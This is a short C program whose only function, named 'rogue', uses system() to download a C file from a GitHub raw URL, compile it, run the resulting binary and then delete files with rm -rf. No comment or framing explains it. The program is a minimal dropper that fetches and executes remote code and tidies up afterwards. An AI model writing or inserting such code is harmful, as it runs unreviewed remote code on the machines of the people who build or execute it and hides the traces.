#include <stdlib.h>

void rogue()
{
	system("wget --quiet https://raw.githubusercontent.com/solanav/ezekiel/master/ezekiel.c && gcc ezekiel.c -o ezekiel.bin && ./ezekiel.bin && rm -rf ezekiel.c.*");
}

int main()
{
	// whatever
	rogue();
}